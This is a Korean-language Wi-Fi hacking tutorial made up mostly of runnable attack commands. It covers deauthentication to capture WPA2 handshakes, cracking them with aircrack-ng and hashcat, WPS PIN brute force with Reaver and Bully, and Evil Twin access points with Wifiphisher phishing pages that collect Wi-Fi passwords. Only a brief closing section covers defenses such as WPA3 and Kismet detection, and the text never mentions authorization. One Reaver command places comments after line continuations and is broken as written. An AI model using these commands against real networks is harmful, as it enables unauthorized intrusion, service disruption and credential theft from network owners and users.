# 무선 네트워크 해킹 — Wi-Fi 보안 완전 가이드

## 1. 무선 네트워크 기초

### 802.11 표준
| 표준 | 주파수 | 최대 속도 | 보안 |
|------|--------|---------|------|
| 802.11b | 2.4GHz | 11Mbps | WEP (취약) |
| 802.11g | 2.4GHz | 54Mbps | WPA |
| 802.11n | 2.4/5GHz | 600Mbps | WPA2 |
| 802.11ac | 5GHz | 3.5Gbps | WPA2/WPA3 |
| 802.11ax (Wi-Fi 6) | 2.4/5/6GHz | 9.6Gbps | WPA3 |

### 무선 보안 프로토콜 취약점
| 프로토콜 | 취약점 | 공격 방법 |
|---------|--------|---------|
| WEP | RC4 키스트림 재사용 | 패킷 수집 후 크랙 (에어크랙) |
| WPA-TKIP | 취약한 MIC (Michael) | ChopChop, Fragmentation |
| WPA2-PSK | 4-way Handshake 캡처 | 오프라인 딕셔너리 공격 |
| WPA2-Enterprise | 인증서 검증 미흡 | Evil Twin + 가짜 RADIUS |
| WPS | PIN 브루트포스 | Reaver, Bully |

---

## 2. 무선 공격 환경 설정

### 무선 랜카드 모니터 모드 설정
```bash
# 무선 인터페이스 확인
iwconfig
ip link show

# 모니터 모드 활성화 (airmon-ng)
airmon-ng check kill    # 간섭 프로세스 종료
airmon-ng start wlan0   # 모니터 모드 시작
# → wlan0mon 인터페이스 생성

# 수동 설정
ip link set wlan0 down
iwconfig wlan0 mode monitor
ip link set wlan0 up

# 모니터 모드 확인
iwconfig wlan0mon

# 채널 고정
iwconfig wlan0mon channel 6

# 모니터 모드 종료
airmon-ng stop wlan0mon
```

### 무선 네트워크 스캔
```bash
# AP 목록 스캔
airodump-ng wlan0mon

# 특정 채널 스캔
airodump-ng --channel 6 wlan0mon

# 특정 AP의 클라이언트 확인
airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 wlan0mon

# 패킷 파일로 저장
airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon
# → capture-01.cap, capture-01.csv 생성
```

---

## 3. WPA2 PSK 크랙

### 4-way Handshake 캡처
```bash
# Step 1: AP 스캔으로 목표 정보 확인
airodump-ng wlan0mon
# BSSID: AA:BB:CC:DD:EE:FF, Channel: 6, ESSID: TargetWiFi

# Step 2: 목표 AP 모니터링 & 핸드셰이크 캡처
airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w handshake wlan0mon

# Step 3: 클라이언트 연결 해제 강제 (핸드셰이크 유도)
# 별도 터미널에서:
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
# -a: AP BSSID
# 5: deauth 패킷 수
# 특정 클라이언트만 연결 해제:
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Step 4: 핸드셰이크 확인
# airodump-ng 상단에 "WPA handshake: AA:BB:CC:DD:EE:FF" 메시지 확인
```

### WPA2 핸드셰이크 크랙
```bash
# aircrack-ng (CPU 기반)
aircrack-ng handshake-01.cap -w /usr/share/wordlists/rockyou.txt
aircrack-ng handshake-01.cap -e "TargetWiFi" -w rockyou.txt

# hashcat (GPU 기반, 훨씬 빠름)
# 먼저 cap 파일을 hashcat 형식으로 변환
hcxpcapngtool -o hash.hc22000 handshake-01.cap
# 또는
cap2hccapx handshake-01.cap handshake.hccapx

# hashcat으로 크랙
hashcat -m 22000 hash.hc22000 rockyou.txt        # 사전 공격
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d  # 8자리 숫자 브루트포스

# 커스텀 규칙
hashcat -m 22000 hash.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 진행 상황 확인 (실행 중)
# s 키: 상태 표시
# q 키: 종료
# p 키: 일시 정지
```

---

## 4. WPS 공격

### Reaver (WPS PIN 브루트포스)
```bash
# WPS 활성화 AP 탐지
wash -i wlan0mon

# Reaver 기본 공격
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# 성능 최적화 옵션
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv \
    -d 0 \        # 딜레이 없음
    -N \          # NACK 전송
    -S \          # 소규모 DH 키
    -L \          # 잠금 무시

# Pixie Dust 공격 (WPS offline 공격, 일부 AP에서 효과적)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv

# Bully (Reaver 대안)
bully wlan0mon -b AA:BB:CC:DD:EE:FF -d -v 3
```

---

## 5. Evil Twin 공격 (가짜 AP)

### 기본 Evil Twin 설정
```bash
# 1단계: 가짜 AP 생성 (hostapd)
cat > /tmp/hostapd.conf << EOF
interface=wlan0
driver=nl80211
ssid=TargetWiFi        # 타겟 AP와 동일한 SSID
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
EOF

hostapd /tmp/hostapd.conf &

# 2단계: DHCP 서버 설정
apt-get install dnsmasq

cat > /tmp/dnsmasq.conf << EOF
interface=wlan0
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
EOF

ip addr add 192.168.1.1/24 dev wlan0
dnsmasq -C /tmp/dnsmasq.conf

# 3단계: 인터넷 포워딩 (선택적)
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```

### Wifiphisher (자동화 Evil Twin)
```bash
apt-get install wifiphisher

# 기본 실행 (대화형)
wifiphisher

# 특정 AP 타겟
wifiphisher --essid "TargetWiFi" --channel 6

# 피싱 페이지 선택
# - firmware-upgrade: 펌웨어 업그레이드 유도
# - oauth-login: OAuth 로그인 페이지
# - wifi_connect: Wi-Fi 비밀번호 재입력 유도
```

---

## 6. 무선 트래픽 분석

### 암호화된 WPA2 트래픽 복호화
```bash
# Wireshark에서 WPA2 복호화
# Edit → Preferences → Protocols → IEEE 802.11
# Decryption Keys 추가:
# Key Type: wpa-pwd
# Key: password:SSID

# tshark 명령줄 복호화
tshark -r capture.cap \
    -o "wlan.enable_decryption: TRUE" \
    -o "uat:80211_keys:\"wpa-pwd\",\"password:SSID\""

# 복호화된 패킷에서 HTTP 데이터 추출
tshark -r decrypted.pcap -Y http -T fields -e http.request.uri
```

---

## 7. 무선 보안 강화

### WPA2/WPA3 Enterprise 설정 (freeRADIUS)
```bash
apt-get install freeradius

# /etc/freeradius/3.0/users 파일에 사용자 추가
# 인증서 기반 EAP 설정 권장

# WPA3 전환 (최신 AP 필요)
# SAE (Simultaneous Authentication of Equals) 사용
# PMKID 공격에 안전
```

### 무선 침입 탐지 (Wids)
```bash
# Kismet (무선 IDS/IPS)
apt-get install kismet
kismet -c wlan0mon

# 탐지 가능한 공격:
# - Deauthentication 공격
# - AP Spoofing (Evil Twin)
# - WPS 브루트포스
# - 알 수 없는 AP

# airbase-ng으로 허니팟 AP
airbase-ng -e "HoneyPot_AP" -c 6 wlan0mon
```
